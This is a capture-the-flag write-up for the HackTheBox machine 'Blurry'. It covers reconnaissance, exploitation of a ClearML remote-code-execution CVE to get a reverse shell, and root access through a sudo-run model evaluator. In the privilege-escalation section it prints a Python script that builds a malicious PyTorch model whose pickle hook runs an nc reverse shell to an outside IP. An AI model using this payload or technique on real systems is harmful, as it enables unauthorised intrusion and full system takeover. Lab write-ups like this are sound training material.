---
title: Blurry
tags:
  - HackTheBox
  - Medium
  - ClearML
  - CVE
  - Python-Vulnerability
  - Linux
---
![](Pasted%20image%2020240904165148.png)
## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.19 blurry.htb" | sudo tee -a /etc/hosts
```

Then I performed an Nmap scan:

```shell
nmap -sC -T4 -p- blurry.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp open  http
|_http-title: ClearML
```

As seen, a redirect is done to `app.blurry.htb`, so I added to the hosts file. Afterwards I decided to take a look at the webpage:

![](Pasted%20image%2020240904170144.png)

## Weaponization

I decided to search for "*ClearML cve*" on the Internet and found the following RCE: [CVE-2024-24590](https://github.com/xffsec/CVE-2024-24590-ClearML-RCE-Exploit)

## Exploitation

First, I logged in as gitblanc, and look up for projects. I noticed a project called **Black Swan**:

![](Pasted%20image%2020240904171314.png)

- I installed ClearML on terminal with: `sudo pip install clearml`
- Then I ran the ClearML setup script: `clearml-init`
- I generated new credentials for configuration:

![](Pasted%20image%2020240904174414.png)

![](Pasted%20image%2020240904172733.png)

- I got some errors related to subdomain `api.blurry.htb` and `files.blurry.htb`, so I added the new domains.

> We've got a reverse shell :D

![](Pasted%20image%2020240904174859.png)

Stabilize it with:

```shell
python3 -c "import pty; pty.spawn('/bin/bash')"
# then
export TERM=xterm
# Press -> Ctrl + Z
stty raw -echo; fg
```

> We've got user flag :D

![](Pasted%20image%2020240904175101.png)

## Privilege Escalation

I'll upload linpeas and run it:

![](Pasted%20image%2020240904175417.png)

![](Pasted%20image%2020240904175603.png)

If we run `sudo -l`:

![](Pasted%20image%2020240904180509.png)

So I investigated a bit and found this script to gain root privileges by generating a malicious model [pytorch-script](https://github.com/v4resk/red-book/blob/main/redteam/privilege-escalation/linux/script-exploits/python/pytorch-models-pth-files-code-execution.md)

- I had to install **torch**: `sudo pip3 install torch`

```python
# generate_model.py
import torch
import torch.nn as nn
import os

class EvilModel(nn.Module):
	def __init__(self):
		super(EvilModel, self).__init__()
		self.dense = nn.Linear(10, 50)
	
	def forward(self, evil):
		return self.dense(evil)
	
	def __reduce__(self):
		# Inject OS command.
		cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.146 777 >/tmp/f"
		return os.system, (cmd,)

# Save the model
evil_model = EvilModel()
torch.save(evil_model, 'evil.pth')
```

I executed the previous script on my machine, and uploaded 'evil.pth' to the victim machine. Then I moved it to `/modules` and executed:

```shell
sudo -u root /usr/bin/evaluate_model /models/evil.pth
```

> We are root now and got root flag! 

![](Pasted%20image%2020240904192225.png)

==Machine pwned==






